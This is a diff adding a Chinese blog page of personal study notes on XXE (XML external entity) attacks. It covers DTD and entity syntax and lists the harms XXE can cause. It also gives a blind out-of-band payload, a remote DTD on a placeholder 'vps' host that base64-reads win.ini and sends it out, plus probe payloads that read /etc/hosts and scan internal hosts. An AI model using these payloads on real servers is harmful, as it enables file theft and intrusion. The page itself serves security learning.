@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.5.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="参考地址：https:&#x2F;&#x2F;blog.csdn.net&#x2F;a15803617402&#x2F;article&#x2F;details&#x2F;82936648https:&#x2F;&#x2F;nikoeurus.github.io&#x2F;2019&#x2F;11&#x2F;06&#x2F;XXE%E6%80%BB%E7%BB%93&#x2F;#%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84xxe">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web安全学习——XXE攻击">
+<meta property="og:url" content="http:&#x2F;&#x2F;no-timing&#x2F;no-timing.github.io&#x2F;2020&#x2F;04&#x2F;04&#x2F;Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94XXE%E6%94%BB%E5%87%BB&#x2F;index.html">
+<meta property="og:site_name" content="no-timing">
+<meta property="og:description" content="参考地址：https:&#x2F;&#x2F;blog.csdn.net&#x2F;a15803617402&#x2F;article&#x2F;details&#x2F;82936648https:&#x2F;&#x2F;nikoeurus.github.io&#x2F;2019&#x2F;11&#x2F;06&#x2F;XXE%E6%80%BB%E7%BB%93&#x2F;#%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84xxe">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2020-04-13T07:29:16.685Z">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://no-timing/no-timing.github.io/2020/04/04/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94XXE%E6%94%BB%E5%87%BB/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>Web安全学习——XXE攻击 | no-timing</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">no-timing</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/no-timing" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://no-timing/no-timing.github.io/2020/04/04/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94XXE%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/ame.jpg">
+      <meta itemprop="name" content="yzz">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="no-timing">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Web安全学习——XXE攻击
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-04-04 15:41:22" itemprop="dateCreated datePublished" datetime="2020-04-04T15:41:22+08:00">2020-04-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-04-13 15:29:16" itemprop="dateModified" datetime="2020-04-13T15:29:16+08:00">2020-04-13</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全学习</span>
+                  </a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>参考地址：</p><p><a href="https://blog.csdn.net/a15803617402/article/details/82936648" target="_blank" rel="noopener">https://blog.csdn.net/a15803617402/article/details/82936648</a></p><p><a href="https://nikoeurus.github.io/2019/11/06/XXE%E6%80%BB%E7%BB%93/#%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84xxe" target="_blank" rel="noopener">https://nikoeurus.github.io/2019/11/06/XXE%E6%80%BB%E7%BB%93/#%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84xxe</a></p><a id="more"></a>
+
+
+<h4 id="DTD简介"><a href="#DTD简介" class="headerlink" title="DTD简介"></a>DTD简介</h4><p>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</p>
+<p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
+<p><strong>内部的DOCTYPE声明</strong></p>
+<p>假如 DTD 被包含在 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>外部文档声明</strong></p>
+<p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="XML文档构成"><a href="#XML文档构成" class="headerlink" title="XML文档构成"></a>XML文档构成</h4><p>所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：</p>
+<ul>
+<li><p><strong>元素</strong>：可包含文本、其他元素或者是空的</p>
+<ul>
+<li><p>声明一个元素：</p>
+</li>
+<li><pre><code class="dtd">&lt;!ELEMENT 元素名称 类别&gt;
+&lt;!ELEMENT 元素名称 (元素内容)&gt;
+&lt;!ELEMENT 元素名称 EMPTY&gt;  //空元素
+&lt;!ELEMENT 元素名称 ANY&gt;    //带有任何内容的元素
+&lt;!ELEMENT 元素名称 (子元素名称 1,子元素名称 2,.....)&gt;    //带有子元素的元素
+&lt;!ELEMENT note (message)&gt;    //声明只出现一次的元素
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* **属性**：可提供有关元素的额外信息。</span><br><span class="line"></span><br><span class="line">  * 属性声明语法：</span><br><span class="line"></span><br><span class="line">  * ~~~dtd</span><br><span class="line">    &lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</span><br><span class="line">     </span><br><span class="line">    demo:</span><br><span class="line">    &lt;!ELEMENT square EMPTY&gt;</span><br><span class="line">    &lt;!ATTLIST square width CDATA &quot;0&quot;&gt;</span><br></pre></td></tr></table></figure></code></pre>
+</li>
+</ul>
+</li>
+<li><p><strong>实体</strong>：用来定义普通文本的变量。实体引用是对实体的引用。</p>
+<ul>
+<li><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。实体引用是对实体的引用。实体可在内部或外部进行声明。 </p>
+</li>
+<li><pre><code>语法
+&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">*</span><br></pre></td></tr></table></figure>
+一个外部实体的声明
+&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  * URI支持的协议</span><br><span class="line"></span><br><span class="line">  * | libxml2 | PHP            | Java     | .NET  |</span><br><span class="line">    | ------- | -------------- | -------- | ----- |</span><br><span class="line">    | file    | file           | http     | file  |</span><br><span class="line">    | http    | http           | https    | http  |</span><br><span class="line">    | ftp     | ftp            | ftp      | https |</span><br><span class="line">    |         | php            | file     | ftp   |</span><br><span class="line">    |         | compress.zlib  | jar      |       |</span><br><span class="line">    |         | compress.bzip2 | netdoc   |       |</span><br><span class="line">    |         | data           | mailto   |       |</span><br><span class="line">    |         | glob           | gopher * |       |</span><br><span class="line">    |         | phar           |          |       |</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">* **PCDATA**：被解析的字符数据，可把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。</span><br><span class="line"></span><br><span class="line">* **CDATA**：字符数据，CDATA 是不会被解析器解析的文本。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</span><br><span class="line"></span><br><span class="line">#### DTD例子</span><br><span class="line"></span><br><span class="line">~~~dtd</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;!DOCTYPE note [  //定义此文档是note类型的文档</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;  //定义note元素有四个元素</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;  //定义to元素为#PCDATA类型</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;  //定义from元素为#PCDATA类型</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line"> </span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&apos;t forget me this weekend&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
+</code></pre></li>
+</ul>
+</li>
+</ul>
+<h4 id="可能造成的危害"><a href="#可能造成的危害" class="headerlink" title="可能造成的危害"></a>可能造成的危害</h4><ul>
+<li>本地文件读取</li>
+<li>内网访问，主机/端口扫描</li>
+<li>网络访问</li>
+<li>系统命令执行（特定协议，如php的expect）</li>
+<li>拒绝服务（嵌套引用，指数爆炸）</li>
+</ul>
+<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><ol>
+<li>客户端发送payload 1给web服务器</li>
+<li>web服务器向vps获取恶意DTD，并执行文件读取payload2</li>
+<li>web服务器带着回显结果访问VPS上特定的FTP或者HTTP</li>
+<li>通过VPS获得回显（nc监听端口）</li>
+</ol>
+<p>本地客户端(payload 1 )：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http://vps/test.xml&quot;&gt; %remote;]&gt;</code></pre><p>test.xml的内容(VPS)：</p>
+<pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=C:/Windows/win.ini&quot;&gt;
+&lt;!ENTITY % x &apos;&lt;!ENTITY &amp;#37; send SYSTEM &quot;http://127.0.0.1/index.php?id=%file;&quot;&gt;&apos;&gt; %x;
+%send;</code></pre><p>先将SYSTEM的php协议读取到的内容赋值给参数实体%file，第二步是一个实体嵌套，%file是远程访问http协议所携带的内容。</p>
+<p> 查看web日志，已将结果返回到日志记录中。 </p>
+<h4 id="发现XXE"><a href="#发现XXE" class="headerlink" title="发现XXE"></a>发现XXE</h4><p>尝试注入特殊字符，使XML失效，引发解析异常，明确后端使用XML传输数据。</p>
+<ul>
+<li>单双引号 ‘ “ 。XML的属性值必须用引号包裹，而数据可能进入标签的属性值。</li>
+<li>尖括号&lt; &gt;。XML的开始/结束标签用尖括号包裹，数据中出现尖括号会引发异常。</li>
+<li>注释符 &lt;!– 。XML使用 &lt;!– This is a comment –&gt; 作注释。</li>
+<li>&amp; 。&amp; 用于引用实体。<br>CDATA 分隔符]]&gt; 。&lt;![CDATA[foo]]&gt; 中的内容不被parser解析，提前闭合引发异常。</li>
+</ul>
+<p>尝试利用实体和DTD。</p>
+<ul>
+<li>引用外部DTD文件访问内网主机/端口。&lt;!DOCTYPE a SYSTEM “<a href="http://127.0.0.1:2333&quot;&gt;" target="_blank" rel="noopener">http://127.0.0.1:2333&quot;&gt;</a> （看响应时间）</li>
+<li>引用外部DTD文件访问外网。&lt;!DOCTYPE a SYSTEM “<a href="http://vps_ip&quot;" target="_blank" rel="noopener">http://vps_ip&quot;</a> &gt;</li>
+<li>引用内部实体。&lt;!DOCTYPE a [&lt;!ENTITY xxe “findneo”&gt;]&gt;<a>&xxe;</a></li>
+<li>外部实体读本地文件。&lt;!DOCTYPE a [&lt;!ENTITY xxe SYSTEM “file:///etc/hosts”&gt;]&gt;<a>&xxe;</a></li>
+<li>外部实体访问内网主机/端口。&lt;!DOCTYPE a SYSTEM “<a href="http://192.168.1.2:80&quot;&gt;（看响应时间）" target="_blank" rel="noopener">http://192.168.1.2:80&quot;&gt;（看响应时间）</a></li>
+<li>外部实体访问外网。&lt;!DOCTYPE a [&lt;!ENTITY xxe SYSTEM “<a href="http://vps_ip&quot;&gt;]&gt;" target="_blank" rel="noopener">http://vps_ip&quot;&gt;]&gt;</a><a>&xxe;</a></li>
+<li>判断问题存在可以OOB提取数据。</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+                <a href="/2020/04/04/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94XML%E6%B3%A8%E5%85%A5/" rel="next" title="Web安全学习——XML注入">
+                  <i class="fa fa-chevron-left"></i> Web安全学习——XML注入
+                </a>
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+                <a href="/2020/04/04/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94XSS%E6%94%BB%E5%87%BB/" rel="prev" title="Web安全学习——XSS攻击">
+                  Web安全学习——XSS攻击 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#DTD简介"><span class="nav-text">DTD简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XML文档构成"><span class="nav-text">XML文档构成</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#可能造成的危害"><span class="nav-text">可能造成的危害</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#盲注"><span class="nav-text">盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#发现XXE"><span class="nav-text">发现XXE</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yzz"
+      src="/images/ame.jpg">
+  <p class="site-author-name" itemprop="name">yzz</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yzz</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">286k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">4:20</span>
+</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
